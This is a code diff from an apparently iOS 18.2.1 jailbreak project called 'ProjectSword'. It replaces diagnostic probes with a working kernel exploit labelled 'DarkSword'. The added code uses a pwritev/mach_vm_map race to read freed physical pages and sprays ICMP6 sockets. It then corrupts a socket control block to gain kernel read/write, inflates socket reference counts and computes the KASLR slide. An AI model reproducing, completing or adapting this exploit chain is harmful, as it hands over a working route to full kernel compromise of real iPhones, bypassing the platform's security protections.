@@ -289,14 +289,29 @@ void sockets_release(void) {
 
 kern_return_t phys_oob_read(mach_port_t memObj, mach_vm_offset_t memOff,
                              mach_vm_size_t size, mach_vm_offset_t off, void *buf) {
-    // Direct read: copy data from freed pages at pcAddress + off
-    // After socket spray, some freed pages may have been reused by inpcbs
-    memcpy(buf, (void*)(pcAddress + off), size);
-    
-    // Check if any data differs from randomMarker (means page was reused)
-    if (scan_freed_pages(buf, size)) {
-        return KERN_SUCCESS;
+    targetObject = memObj;
+    targetObjectOffset = memOff;
+    iov.iov_base = (void*)(pcAddress + 0x3f00);
+    iov.iov_len = off + size;
+    *(uint64_t*)buf = randomMarker;
+    *(uint64_t*)(pcAddress + 0x3f00 + off) = randomMarker;
+    for (int t = 0; t < highestSuccessIdx + 100; t++) {
+        raceSync = 1;
+        pwritev(readFd, &iov, 1, 0x3f00);
+        while (raceSync == 1) {}
+        mach_vm_map(mach_task_self(), &pcAddress, pcSize, 0,
+            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, pcObject, 0, 0,
+            VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
+        pread(readFd, buf, size, 0x3f00 + off);
+        if (*(uint64_t*)buf != randomMarker) {
+            if (t > highestSuccessIdx) highestSuccessIdx = t;
+            targetObject = 0;
+            return KERN_SUCCESS;
+        }
+        usleep(1);
+        if (t == 500) break;
     }
+    targetObject = 0;
     return 1;
 }
 
@@ -1261,47 +1276,107 @@ bool run_darksword(void) {
     else executableName = executablePath;
     printf("[+] executableName: %s\n", executableName);
 
-    // Phase 0: IOKit diagnostic
+    // Quick IOKit sanity check (kept from diagnostic builds)
     diagnostic_iokit();
 
-    // Phase 1: Try SystemMemory approach (enhanced scan)
-    bool sysmem = method_system_memory();
-    printf("[Method: SystemMemory] %s\n\n", sysmem ? "OVERLAP DETECTED!" : "no overlap");
+    // ===== Real DarkSword ICMP6 socket exploit =====
+    init_target_file();
 
-    // Phase 2: AIO cross-mapping exploit with dual memory entries
-    bool aio = method_aio_exploit();
-    printf("[Method: AIO_Exploit] %s\n\n", aio ? "AIO EXPLOIT WORKS" : "failed (expected)");
+    pthread_create(&freeThread, NULL, free_thread, NULL);
 
-    // Phase 3: Try sendmsg (check if EFAULT on remap)
-    bool sendmsg = method_sendmsg_race();
+    uint64_t mappingPages = 0x1000 * 0x10;
+    uint64_t searchSize = 0x2000 * PAGE_SIZE;
+    uint64_t totalSize = mappingPages * PAGE_SIZE;
+    uint64_t mappingNum = totalSize / searchSize;
 
-    // Phase 4: proc_info
-    bool pi = method_proc_info();
+    void *rBuf = calloc(1, OOB_SIZE);
+    void *wBuf = calloc(1, OOB_SIZE);
+    if (!initialize_bounce_buffer(OOB_PAGES_NUM * PAGE_SIZE))
+        return false;
 
-    // Phase 5: PurpleGfxMem overlap
-    bool purp = method_purple_mem();
+    NSMutableArray *usedGc = [NSMutableArray new];
 
-    // Phase 6: PurpleGfxMem info leak (raw fresh pages)
-    bool purpLeak = method_purple_info_leak();
+    int attempt = 0;
+    while (1) {
+        attempt++;
+        printf("[exploit] attempt %d: spraying sockets...\n", attempt);
+        NSMutableArray *mappings = [NSMutableArray new];
+        for (uint64_t s = 0; s < mappingNum; s++) {
+            mach_vm_address_t a = 0;
+            mach_vm_allocate(mach_task_self(), &a, searchSize,
+                VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
+            for (uint64_t k = 0; k < searchSize; k += PAGE_SIZE)
+                *(uint64_t*)(a + k) = randomMarker;
+            [mappings addObject:@(a)];
+        }
 
-    // Phase 7: H11ANE fuzzing
-    method_h11ane_fuzz();
+        socketPorts = [NSMutableArray new];
+        socketPcbIds = [NSMutableArray new];
+        for (int i = 0; i < (10240 * 3 - 4096 * 2); i++) {
+            if (spray_socket() == -1) break;
+        }
 
-    // Phase 8: JPEGDriver exhaustive size scan (finds dispatch table struct sizes)
-    method_jpeg_size_scan();
+        bool ok = false;
+        for (uint64_t s = 0; s < mappingNum; s++) {
+            mach_vm_address_t sma = [(NSNumber*)mappings[s] unsignedLongLongValue];
+            mach_port_t memObj = 0;
+            mach_vm_size_t mos = searchSize;
+            mach_make_memory_entry_64(mach_task_self(), &mos, sma,
+                VM_PROT_DEFAULT, &memObj, 0);
 
-    // Phase 9: ImageIO trace — decode real JPEG, check IOSurface backing
-    method_imageio_trace();
+            for (mach_vm_offset_t so = 0; so < searchSize; so += PAGE_SIZE) {
+                if (phys_oob_read(memObj, so, OOB_SIZE, OOB_OFFSET, rBuf) == KERN_SUCCESS) {
+                    if (find_and_corrupt_socket(memObj, so, rBuf, wBuf, usedGc, false) == 0) {
+                        ok = true;
+                        break;
+                    }
+                }
+            }
+            mach_port_deallocate(mach_task_self(), memObj);
+            if (ok) break;
+        }
 
-    printf("=== Results ===\n");
-    printf("SystemMemory overlap: %d\n", sysmem);
-    printf("PurpleGfxMem overlap: %d\n", purp);
-    printf("PurpleGfxMem info leak: %d\n", purpLeak);
-    printf("AIO exploit: %d\n", aio);
-    printf("sendmsg race: %d\n", sendmsg);
-    printf("proc_info: %d\n", pi);
+        sockets_release();
+        for (uint64_t s = 0; s < mappingNum; s++) {
+            mach_vm_deallocate(mach_task_self(),
+                [(NSNumber*)mappings.lastObject unsignedLongLongValue], searchSize);
+            [mappings removeLastObject];
+        }
 
-    return false;
+        if (ok) break;
+        printf("[exploit] attempt %d: no socket found, retrying\n", attempt);
+    }
+
+    goSync = 0; raceSync = 1;
+    pthread_join(freeThread, NULL);
+    close(writeFd); close(readFd);
+
+    controlSocketPcb = kread64(rwSocketPcb + 0x20);
+    uint64_t csa = kread64(controlSocketPcb + OFFSET_PCB_SOCKET);
+    uint64_t rsa = kread64(rwSocketPcb + OFFSET_PCB_SOCKET);
+    if (!csa || !rsa) return false;
+
+    kwrite64(csa + OFFSET_SOCKET_SO_COUNT,
+        kread64(csa + OFFSET_SOCKET_SO_COUNT) + 0x100010010001001ULL);
+    kwrite64(rsa + OFFSET_SOCKET_SO_COUNT,
+        kread64(rsa + OFFSET_SOCKET_SO_COUNT) + 0x100010010001001ULL);
+    kwrite64(rwSocketPcb + OFFSET_ICMP6FILT + 8, 0);
+
+    uint64_t sp = kread64(controlSocketPcb + OFFSET_PCB_SOCKET);
+    uint64_t pp = kread64(sp + OFFSET_SO_PROTO);
+    uint64_t tp = kread64(pp + OFFSET_PR_INPUT);
+    gKernelBase = tp & 0xFFFFFFFFFFFFC000;
+    while (1) {
+        uint64_t magic = kread64(gKernelBase);
+        if ((magic & 0xFFFFFFFFFFFFFF) == 0x100000cfeedfacf &&
+            kread64(gKernelBase + 8) == 0xc00000002) break;
+        gKernelBase -= PAGE_SIZE;
+    }
+    gKernelSlide = gKernelBase - 0xfffffff007004000ULL;
+    printf("[+] KASLR slide: 0x%llx\n", gKernelSlide);
+
+    free(rBuf); free(wBuf);
+    return true;
 }
 
 // ===== Kernel struct walking =====
@@ -1587,13 +1662,12 @@ bool remount_private_preboot(void) {
 
 void run_jailbreak(void) {
     @autoreleasepool {
-        printf("=== ProjectSword DIAGNOSTIC - iOS 18.2.1 A14 ===\n\n");
+        printf("=== ProjectSword - iOS 18.2.1 A14 ===\n\n");
 
-        // Phase 1: Multi-method diagnostic + exploit test
-        printf("[Phase 1] Testing exploit methods...\n");
+        // Phase 1: DarkSword ICMP6 kernel exploit
+        printf("[Phase 1] Running DarkSword exploit...\n");
         if (!run_darksword()) {
-            printf("[-] All methods failed (report results above)\n");
-            printf("[*] This was a diagnostic build. See logs for which primitives work.\n");
+            printf("[-] Exploit failed (no kernel R/W)\n");
             return;
         }
         printf("[+] Kernel R/W via ICMP6 sockets\n\n");
